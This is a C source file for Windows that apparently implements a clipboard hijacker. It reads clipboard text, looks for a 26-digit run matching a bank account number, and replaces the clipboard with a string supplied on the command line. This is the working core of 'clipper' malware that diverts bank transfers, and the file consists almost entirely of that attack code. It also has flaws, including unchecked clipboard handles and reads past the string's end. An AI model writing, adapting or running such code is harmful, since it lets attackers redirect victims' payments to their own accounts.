#include <windows.h>
#include <string.h>
#include <stdio.h>

// simply returns text stored in the clipboard
char* get_current_content(){

    char* returned_string = NULL;
    HANDLE clipboard_copy = NULL;

    if(OpenClipboard(NULL) == FALSE){
        // if failed to open
        return NULL;
    }

    // I'm copying the content of the clipboards text data
    clipboard_copy = GetClipboardData(CF_TEXT);
    // and now I need to create new string on the heap
    // allocating: length of the string + one '\0' char
    returned_string = (char*)malloc(strlen(clipboard_copy) + 1);

    strcpy(returned_string, clipboard_copy);
    
    CloseClipboard();
    return returned_string;
}

// creates new global variable, sets its value
// cleans the clipboard and finally updates it
void replace_clipboard(const char* str){
    size_t len = (strlen(str) + 1);
    HGLOBAL hG = GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hG), str, len);

    GlobalUnlock(hG);

    OpenClipboard(NULL);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hG);
    CloseClipboard();
}

// testing purposes
enum boolean {
    false,
    true
};
// replaces content of the clipboard
void replace_acc_num(const char* str){
    char* temp = get_current_content();
    short contains = false;
    short min_num = 48, max_num = 57;

    if(strlen(temp) >= 26){
        for(int i = 0; i <= strlen(temp); i++){
            if(temp[i] >= min_num && temp[i] <= max_num) { // if char is a number
                for(int j = 0; j < 26; j++){
                    if(temp[i + j] < min_num || temp[i + j] > max_num){
                        break;
                    }
                    if(j == 25){
                        contains = true;
                    }
                }
                if(contains){
                    break;
                }
            }
        }
    }
    if(contains){
        replace_clipboard(str);
    }
    return;
}

int main(int ac, char*av[]){

    const char* replacement = NULL;
    if (ac > 1) {
        replacement = av[1];    
    }
    else {
        replacement = "All your base are belong to us";    
    }

    char* str_1 = get_current_content();
    printf("%s\n", str_1);

    replace_acc_num(replacement);

    char* str_2 = get_current_content();
    printf("%s\n", str_2);

    return 0;
}